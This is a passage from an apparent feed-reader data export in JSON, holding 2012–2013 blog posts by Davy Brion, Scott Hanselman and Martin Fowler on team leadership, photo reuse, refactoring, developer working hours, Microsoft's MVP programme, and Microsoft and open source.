if you're not officially in a leadership position, there's no reason why you can't set the tone and <em>be a leader</em>. Start making an impact on one or two people and build off of that growth. Once you've got a few people convinced, it's much easier to bring the rest along with you. You don't need to shoot for the stars from the beginning either. Try to improve whatever it is you think needs improvement with small steps, in an iterative approach. Instead of thinking \"that will never work for my team\", think \"we're not quite ready for that <em>yet</em>, but we will be someday\".</p><p>If you believe you can't improve your way of working due to organizational reasons, it's important to also start with your team. It's easy for management to ignore the opinion of one person, but it gets progressively harder for them to ignore it as more and more people start asking for change. It's much easier to persuade management to try something new if you can show that the whole team believes it's worth a shot. Keep pressing the issue until you get the chance to try it for a short time. If you keep asking for it, management might just get tired of hearing it and who knows, they'll grant you some time to try it out. You'll never know if you stop trying.</p><p>Of course, you won't always succeed in convincing management or your coworkers. But you've gotta try. And if you keep hitting walls, you might actually be better off moving on to another job with other people instead of being frustrated in your current position. Even if you don't agree with what I'm saying in this post, you can't possibly disagree with this: not trying will get you nowhere.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=vmRCqUkdXLU:0dHmB8pfeyA:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=vmRCqUkdXLU:0dHmB8pfeyA:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=vmRCqUkdXLU:0dHmB8pfeyA:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/vmRCqUkdXLU\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1197}}
{"k":"0000000084","o":"0000008244","v":"001"}
{"_id":1198,"_uid":1198,"_dt":1373742620958,"_s":"4eb21abf24a41eceb668954d55d64323"}
{"subscription":{"$wrap":"$oid","v":39},"link":"http://feeds.hanselman.com/~/42469408/0/scotthanselman~They-WILL-take-your-photos-and-they-WILL-use-them-and-you-WILL-like-it.aspx","title":"They WILL take your photos and they WILL use them and you WILL like it.","published":{"$wrap":"$date","v":1371621093000,"h":"2013-06-19T05:51:33.000Z"},"starred":false,"read":false,"content":"<div><p>This is hardly a tragic story and it's not even a good photo, but it's interesting because it happens a few times a year. Perhaps it's happened to you! (Share in the comments)</p><p>A buddy noticed a story in<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~au.businessinsider.com/microsoft-cybercrime-500-million-theft-2013-6\">Business Insider Australia</a>that was picked up off Reuters called\"Microsoft says they've disrupted a global cybercrime ring responsible for $500 Million Theft.\"It was syndicated to OZ by Business Insider US who pulled it from Reuters, and it seems they each pick their own illustrative picture.</p><p>And apparently they did it in<strong>my damn office.</strong>That's my big head, my three monitors and I am, in fact, hacking on CoffeeScript in this picture, not fighting cybercrime. How do I know? Because I was there when this photo was taken by Rob Conery. We used it<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.speakinghacks.com\">for my Speaking Hacks educational video</a>.</p><p><img title=\"image\"style=\"display: inline\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/They-will-take-your-photos-and-use-them-_13793/image_3.png\"width=\"500\"height=\"517\"></p><p>Rob Conery and I made a video called Speaking Hacks...here's a screen capture.</p><p><img title=\"image\"style=\"display: inline\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/They-will-take-your-photos-and-use-them-_13793/image_9.png\"width=\"640\"height=\"283\"></p><p>It got used on a post a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://coderwall.com/p/fgtlba\">CoderWall.com</a>where I describe my system setup. I love that they crop the pictures they so carefully Google Image Search for.</p><blockquote><p>I try to use<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~search.creativecommons.org\">search.creativecommons.org</a>for my image searches on this blog. Raphael Rivera turned me on to this and reminded me of the importance of respecting image copyright. Just googling for a picture and slapping it on your blog isn't cool.</p></blockquote><p>Usually when this kind of thing happens I'll just email a kind note to the owner of the site and mention it and it gets handled. (I've just emailed Business Insider now) Most people are<em>very</em>nice. Folks at Gizmodo and LifeHacker almost always have a real human behind their stories with a real Twitter account and they've always been accommodating about little things.</p><p>Ah, but sometimes it's not just a nameless-faceless newspaper but it's a nameless-faceless newspaper article originally published by Reuters on\"put on the wire\"which means it can spread literally everywhere, and fast.</p><p>Do I care? Not really, but it's the principle of the thing. I mention it because it's a teachable moment for us all.</p><blockquote><p>When you put an image on the Internet, it's<strong>on the Internet.</strong></p></blockquote><p>It can be used for anything, anytime, by anyone. You can assert copyright, but usually depending on how big the site is (or how obtuse their Contact Us page is) you'll be lucky to find a human, much less a nice one.</p><p><img title=\"image\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/They-will-take-your-photos-and-use-them-_13793/image_6.png\"width=\"630\"height=\"163\"></p><p>At least I have my hair. So far.</p><h3>Think about signing that Photo Release</h3><p>It matters to me when it's big and public and involves my kids. Some friends were driving down the freeway recently and noticed something. They called and said\"Is that your son on a billboard off I-5?\"</p><p>This was my reaction: O_o</p><p><img title=\"image\"style=\"display: inline\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/They-will-take-your-photos-and-use-them-_13793/image_15.png\"width=\"500\"height=\"375\"></p><p>Turns out that years ago in our school's day care we signed a photo release. I assume we thought it was for their blog, or a pamphlet, but in retrospect even that was a bad idea. We never thought my kid would end up on a 30 foot paper billboard advertisement, with little recourse. Fortunately in the billboard case, the head of the school wasn't aware either! Their marketing folks were just pulling the photos from a shared folder, treating them as stock images. In the end, the school was<em>extremely</em>accommodating and apologetic and it's since been handled. Still, a wake up call to us, and I hope, to you, Dear Reader.</p><h3>Happy Resolution</h3><p>This email showed up<em>literally</em>as I was/am writing this post.</p><blockquote><p>Hi Scott<u></u><u></u><p><u></u><u></u><p>Thanks for getting in touch. I’m the editor at Business Insider Australia.<u></u><u></u><p><u></u><u></u><p>I’ve removed that image, which was syndicated from the US edition. I’ve also alerted them to your complaint.<u></u><u></u><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~au.businessinsider.com/microsoft-cybercrime-500-million-theft-2013-6\">http://au.businessinsider.com/microsoft-cybercrime-500-million-theft-2013-6</a><u></u><u></u><p><u></u><u></u><p>Hope this addresses the matter for you.<u></u><u></u><p>Best wishes,<u></u><u></u><p>Paul</p></blockquote><p>Awesome. And sometimes your kind letter reaches a kind human and gets handled. Thanks Paul, much respect!</p><p>Now, about this NEW picture...;)</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~au.businessinsider.com/microsoft-cybercrime-500-million-theft-2013-6\"><img title=\"image\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/They-will-take-your-photos-and-use-them-_13793/image_14.png\"width=\"475\"height=\"407\"></a> </p><p><em>(Yes, I realize the thick irony of me blogging it, and thereby putting the image\"back out there\"but it's for educational purposes.)</em></p><br/><hr/>©2013 Scott Hanselman. All rights reserved.<br/></div><Img align=\"left\"border=\"0\"height=\"1\"width=\"1\"style=\"border:0;float:left;margin:0;padding:0\"hspace=\"0\"src=\"http://feeds.hanselman.com/~/i/42469408/0/scotthanselman\"><div style=\"clear:both;padding-top:0.2em;\"><a title=\"Like on Facebook\"href=\"http://feeds.hanselman.com/_/28/42469408/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/fblike20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Share on Google+\"href=\"http://feeds.hanselman.com/_/30/42469408/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/googleplus20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Tweet This\"href=\"http://feeds.hanselman.com/_/24/42469408/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/twitter20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by email\"href=\"http://feeds.hanselman.com/_/19/42469408/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/email20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by RSS\"href=\"http://feeds.hanselman.com/_/20/42469408/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/rss20.png\"style=\"border:0;margin:0;padding:0;\"></a> </div>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1198}}
{"k":"0000000084","o":"0000000425","v":"001"}
{"_id":1199,"_uid":1199,"_dt":1373742620958,"_s":"58ed0c89ba1872eb12dea6e640e47e50"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/photos/48.html","title":"photostream 48","published":{"$wrap":"$date","v":1371221700000,"h":"2013-06-14T14:55:00.000Z"},"starred":false,"read":false,"content":"<p><a href = 'http://martinfowler.com/photos/48.html'><img src = 'http://martinfowler.com/photos/48.jpg'></img></a></p><p></p><p>Melrose, MA</p>","author":false,"_id":{"$wrap":"$oid","v":1199}}
{"k":"0000000084","o":"0000003987","v":"001"}
{"_id":1200,"_uid":1200,"_dt":1373742620958,"_s":"2f1966414ad8445f7cd90dd252c9f5d8"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/OFSdEDuJMHc/","title":"Three Strikes And You Refactor","published":{"$wrap":"$date","v":1336314970000,"h":"2012-05-06T14:36:10.000Z"},"starred":false,"read":false,"content":"<blockquote><p>The first time you do something, you just do it. The second time you do something similar, you wince at the duplication, but you do the duplicate thing anyway. The third time you do something similar, you refactor.</p></blockquote><p>That's a quote from Don Roberts, found in Martin Fowler's Refactoring book (page 58). That quote didn't really make me think twice at the time I read it, but it got stuck in my head later on when I heard it from someone who's always been very influential to me. When this person told me that this was one of his favorite rules, I was still in my \"no way dude, all code needs to be as clean as it can be\" phase. But it's really grown on me over the last few years. Now, just to avoid any confusion: this post is about <em>my interpretation</em> of 'Three Strikes And You Refactor', not about what may have been originally intended or what some people think of it now.</p><p>The most important thing I remember when learning about TDD was:</p><ol><li><p>Write a failing test</p></li><li><p>Do the simplest thing that could possibly work to make the test pass.</p></li><li><p>Refactor.</p></li></ol><p>With all the literature that's out there, as well as popular opinion on how important clean code is, it's tempting to go overboard with that 'refactor' step. It's tempting to go for the solution that is crispy clean. The solution that'll have your coworkers or peers go \"ohhh, now <em>that</em> is nice\". However, you really need to ask yourself the following question: \"is it really worth it?\". Wanting to make sure that every piece of code is perfect takes up a lot of time, and I've learned that it certainly isn't always worth it. Besides, it's quite easy to go off on a path of introducing new concepts and abstractions to your code that end up being totally unnecessary. If this increases complexity in parts that don't really matter, it ends up being a huge waste. Not only for the person who wrote it, but for every person who has to read it and comprehend it later on.</p><p>'Three Strikes And You Refactor' is a helpful rule of thumb here. Try to keep things as simple as possible and don't be afraid of a <em>little</em> duplication here or there. Once you find yourself (or a teammate) doing the same thing for a third time, it's worth cleaning up because that third time very often means that it wouldn't be the last time either. This way, you only introduce concepts and abstractions that are really needed, and enables you to avoid adding unnecessary cruft to the code.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OFSdEDuJMHc:gDoJMj70oqo:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OFSdEDuJMHc:gDoJMj70oqo:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OFSdEDuJMHc:gDoJMj70oqo:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/OFSdEDuJMHc\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1200}}
{"k":"0000000084","o":"0000005054","v":"001"}
{"_id":1201,"_uid":1201,"_dt":1373742620959,"_s":"414130e2d2339389637bff7cf81c2a97"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/uXaRMjqjhFA/","title":"It’s Not About The Number Of Hours You Put In","published":{"$wrap":"$date","v":1334864118000,"h":"2012-04-19T19:35:18.000Z"},"starred":false,"read":false,"content":"<p>There's been a lot of talk on twitter about the <ahref=\"http://501manifesto.org/\">501 Manifesto</a>. Be sure to read it if you haven't, because it's got some very good points, though I don't like the dig at people who contribute to open source since these people are having an ever increasing positive impact on our jobs. Anyways, the manifesto is about being a software developer without being defined by it. I actually think it's a healthy point of view.</p><p>I've always disagreed with this seemingly popular point of view or opinion that every developer should spend a lot of time outside of his/her working hours blogging or publishing their code on Github or contributing to open source. Those activities <em>can</em> be important but aren't necessarily so and the people doing them aren't inherently more valuable or important than developers who choose not to contribute to open source software or who don't feel the need to make a name for themselves. I also disagree with the notions that developers who are only involved with software development during their 8 working hours a day must be inferior or that they can't be passionate about it or that they'll never be great at it or any of that other crap that you'll sometimes hear people say.</p><p>I know some great developers who put their code out there and/or their thoughts by blogging. I also know some bad developers who put their code out there and/or their thoughts by blogging. I know some great developers who aren't involved with software development outside their working hours. I also know some bad developers who aren't involved with software development outside their working hours. There are good and bad developers on both sides of every situation you can come up with.</p><p>I think it depends a lot on what people do <em>during their 8 working hours</em>. Can we really say that developers who work 8 hours a day on challenging projects with strong co-workers in teams where knowledge is passed around continuously are missing out on anything if they don't really spend any other time on software development outside of work? That just doesn't make a lot of sense to me. If I look back on my own career so far, I've typically been rather passive outside of working hours in periods where I felt like I was working on cool things, where I was challenged, where I was learning a lot on the job. Conversely, I've always been much more involved with software development outside of work when I was working on things during working hours that I didn't find challenging or interesting or where I wasn't learning anything new. I'm guessing that this holds true for a lot of people, though certainly not all.</p><p>Of course, if you're not working on interesting things or continuously learning and improving on the job, it's your own responsibility to make sure that your skills and insights stay up to date. You don't <em>have</em> to put in the effort to do that, but if you don't, you don't really have a reason to complain either when you're not happy with the kind of work that you're doing. Your employer is not responsible for your career and your future, you are.</p><p>And if you are working on interesting things and continuously learning and improving on the job, you don't need to pressure yourself to do more outside of your working hours because certain people in the community say you should. A lot of people get involved with blogging and open source with the hope that it'll end up leading to more interesting work in the long term. Who knows, you might just be a step ahead of them already.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=uXaRMjqjhFA:Bygtonu7YhM:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=uXaRMjqjhFA:Bygtonu7YhM:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=uXaRMjqjhFA:Bygtonu7YhM:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/uXaRMjqjhFA\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1201}}
{"k":"0000000084","o":"0000010700","v":"001"}
{"_id":1202,"_uid":1202,"_dt":1373742620959,"_s":"ec1a4825a804ebd7fbb7e5bfc9b7b2d8"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/v0N7GPTJ8-o/","title":"Most Valuable Professionals? Give Me A Break.","published":{"$wrap":"$date","v":1334513509000,"h":"2012-04-15T18:11:49.000Z"},"starred":false,"read":false,"content":"<p>I've always been very skeptical of Microsoft's MVP award. Officially, Microsoft's MVP award stands for Most Valuable Professional, but its true meaning is probably closer to Most Valuable Promoter. The quality and integrity of the MVP's you know is probably dependent on the region in which you work. I work in Belgium, and over here the MVP program is, in my opinion, a joke. I'm going to discuss why I think it's a joke but keep in mind that this will depend on your region. I know that there are indeed great MVP's out there who do have professional integrity and true real world experience in some regions, but I certainly wouldn't be surprised if the state of the MVP program in Belgium occurs in other regions as well.</p><p>First of all, let's take a look at an image that Microsoft uses on its <ahref=\"http://mvp.support.microsoft.com/\">MVP page</a>:</p><p><imgsrc=\"http://davybrion.com/mvp.png\" alt=\"MVP image\" /></p><p>\"Independent Experts. Real world Answers.\"</p><p>This is indeed what the MVP program <em>should</em> be about. It is however the exact opposite of what I and many others in Belgium have experienced. Let's cover the words in those 2 sentences a bit more in-depth.</p><h3>Independent</h3><p>Most of the .NET MVP's in Belgium work for a handful of companies that happen to be big sponsors of every important Microsoft event in Belgium. Now, could it be possible that the best .NET developers in Belgium all work for these handful of companies? I highly doubt it. I know a lot of great developers in Belgium and none of them work for these companies. And I'm quite sure that none of those people are less valuable or knowledgeable than any of those MVP's. In my experience, there is hardly anything independent about the Belgian .NET MVP's. Most of them got their first MVP award while they were employed by sponsors or 'strategic partners' of Microsoft. Most of them tout the latest and greatest Microsoft technologies, pretty much unquestioned, even if it means contradicting their statements and positions when they were promoting the technology that Microsoft wanted them to promote 3 or 4 years ago. And they're never openly critical of anything Microsoft-related out of fear that it will negatively impact their chances of being renewed as an MVP. They may not work for Microsoft, but they are anything but independent of Microsoft.</p><h3>Experts</h3><p>This is a tough one. What makes one an expert? In some fields, people are considered to be experts based on the amount of research they've done. In other fields, people are considered to be experts based on what they've actually done. I don't think I'm going out on a limb here by saying that in the field of software development, what you've done <em>should</em> be more important than what you've researched or read about. In my opinion, an expert in a specific technology should have built at least one, and ideally more than one, non-trivial system using the technology in question and should be able to tell you about mistakes they've made, things you should avoid, and should never use examples that promote bad practices. I rarely hear MVP's talk about things you should avoid. I rarely hear MVP's talk about mistakes they've learned from. I routinely see examples from MVP's that make me cringe. I routinely hear MVP's promote technologies even though they haven't actually built anything impressive with it. I think of a lot of words when I see examples or proposed solutions by MVP's, but the word 'expert' unfortunately isn't one of them. This also applies to the Microsoft Extended Experts Team by the way. I can only question the validity of such a team if it contains people who are listed as experts of a particular technology when I happen to know for a fact that some of those people have never even used the technology they're supposed to be an expert in in a real world project. Let's be honest here: most of the MVP's and the MEET members simply aren't experts. They are people who have a strong interest in a particular (or more) technology and do their best to promote said technology. There's nothing wrong with that at all, but there's a huge difference between that and being an expert in something.</p><h3>Real world answers</h3><p>This one cracks me up the most because most of the Belgian MVP's hardly work on real world projects. And when they do, they typically work on \"multiple projects\" as they like to say it. For anyone who's ever worked on multiple projects at the same time: could you honestly say that your contributions were truly valuable to the end result? Let me put it differently: don't we all know that people generally produce the best results when they don't have to juggle too many things at once and can focus on as few things as possible? You will rarely hear about a Belgian MVP working full time on a non-trivial real-world project. A lot of them get to spend a certain number of paid hours each week on 'community work', which means blogging, writing articles for magazines, creating presentations for events, etc. When they're not working on that, you'll often find them talking on Twitter about pretty much anything but interesting or demanding work. And of course, their employers will occasionally send them to clients for a bit of consulting here or there, or to do a product demo. Unless these guys are putting in 60 to 80 hours a week (which I seriously doubt), I'm having trouble figuring out when exactly they do the kind of interesting work on real world projects that would enable them to provide answers based on real world experience.</p><p>It also doesn't help that I've frequently heard rather unflattering stories about these MVP's from people who've worked with them. It's pretty much always the same: they're not invested into the project, they spend too much time 'interacting with the community' and if you let them go near important parts of the code base, bad things usually happen. Now, I'm not the type of person who simply believes everything he hears. In fact, when it comes to matters like these, I generally only believe the stories I hear from people of whom I'm truly sure that they know what they're talking about. And if you've been reading this blog for a while, you'll know I'm rather critical and that I set the bar rather high when it comes to that.</p><p>Lastly, my personal working experience with MVP's has been abysmal as well. I once worked for a client where we had to get rid of 2 people because of how bad they performed in real world circumstances. One of them was an MVP at the time, and now works at Microsoft as an Evangelist. The other wasn't an MVP at the time, but has been one for a few years now and is even one of the Regional Directors of this region. A few years later, I had drinks with a manager of the company they both worked for and he bluntly admitted that both of them are useless on real projects but that their MVP status was a huge benefit to the company from a marketing and image perspective. Not exactly the image or branding I'd be looking to put out there, but hey, to each his own.</p><h3>Why On Earth Did I Write This?</h3><p>For 2 reasons. I think this whole MVP thing sets a bad example to young and impressionable developers who aren't sure what to focus on to advance their careers. To outsiders, these MVP's sure look like they've got a great thing going and it's easy to see how that could impress people who don't know better. There are already quite a few developers who suck up to these MVP's in the hopes of someday getting to 'that level' as well. I'd much rather see these people put effort into learning about concepts that will last them a long time and building skills that are transferable to multiple technologies instead of sucking up to the wrong people, and trying to network their way to more interesting work because the work that results from that is truly mediocre at best. By all means, try to make a name for yourself by blogging and speaking publicly. But do yourself a favor and stay true to yourself and favor quality over quantity when considering the audience you want to target. Hey, it worked for me <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>The second reason is because this whole MVP thing is, in my opinion at least, offensive to the many dedicated professionals who give their all at their jobs as they work on real projects that matter, as they try to mentor younger developers in their workplace, as they try to optimize the way they develop software not only for themselves, but for their teammates and their employers or clients. These are your true <em>valuable professionals</em>.</p><p>I'm sure I'm gonna get a lot of flak for this post, but honestly, it won't really make any difference to me. The people who'll be offended are people I'd rather not work with anyway. And of course, I feel quite confident that I'll rarely, if ever, have to deal with these people in a professional setting since I'm primarily interested in interesting and demanding work <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=v0N7GPTJ8-o:IFYpPR8TCZk:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=v0N7GPTJ8-o:IFYpPR8TCZk:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=v0N7GPTJ8-o:IFYpPR8TCZk:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/v0N7GPTJ8-o\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1202}}
{"k":"0000000084","o":"0000003916","v":"001"}
{"_id":1203,"_uid":1203,"_dt":1373742620959,"_s":"8963744f20a8daebc3f80a6d4a384e89"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/ZetNB_-CXM0/","title":"Microsoft And Open Source: Hoping For Better Collaboration","published":{"$wrap":"$date","v":1333980288000,"h":"2012-04-09T14:04:48.000Z"},"starred":false,"read":false,"content":"<p>By now, you've probably all heard that Microsoft is moving to an open development model for ASP.NET MVC and some other ASP.NET projects. Even though the source code of ASP.NET MVC has always been available under an open source license, its development followed a closed development model. This meant that outside contributions weren't possible, nor were we able to follow the actual commits in the MVC source code repository. With the recent announcements, this is no longer the case and I think this is fantastic news. It finally enables collaboration between Microsoft employees and people outside of Microsoft on a strategically important Microsoft product. This is good for Microsoft as well as the open source .NET community.</p><p>I hope that this newfound appreciation for Open Source within Microsoft will lead to another huge improvement in collaborative development in the open source .NET community. While Microsoft is now open to accepting contributions from the community, it would be a tremendous step forward if Microsoft would also contribute to other prominent open source .NET projects in the future. In the past, we've seen numerous open source .NET projects become popular and widely used. And unfortunately, Microsoft responded to some of those projects by producing their own libraries and frameworks that basically do the same thing. Except that, for most of those projects, they never quite matched the quality of the open source projects they were inspired by. If only all of that effort spent on duplicating already existing libraries would've been spent on <em>improving what was already there</em>, the entire .NET community would've been better for it.</p><p>I'd love to see a Microsoft that works <em>with</em> open source developers and encourages them, instead of trying to duplicate their efforts whenever they feel they need to provide their own library or framework for something that's already covered by a superior open source alternative. These duplicated projects only alienate people that at one point were passionate enough about the .NET platform to work on improving it for free, in their spare time. These are the people that Microsoft needs to cherish and nourish instead of competing with them. Microsoft has shown some interesting signs of better understanding of open source development and collaboration in the past year or so. Here's to hoping they take that critical next step as well.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=ZetNB_-CXM0:Q3Vmo47-Fxg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=ZetNB_-CXM0:Q3Vmo47-Fxg:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=ZetNB_-CXM0:Q3Vmo47-Fxg:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=ZetNB_-CXM0:Q3Vmo47-Fxg:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=ZetNB_-CXM0:Q3Vmo47-Fxg:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=ZetNB_-CXM0:Q3Vmo47-Fxg:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=ZetNB_-CXM0:Q3Vmo47-Fxg:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=ZetNB_-CXM0:Q3Vmo47-Fxg:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/ZetNB_-CXM0\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1203}}
{"k":"0000000084","o":"0000006999","v":"001"}
{"_id":1204,"_uid":1204,"_dt":1373742620960,"_s":"da8931d071b6b8f098dc8bdfab3ae6e5"}
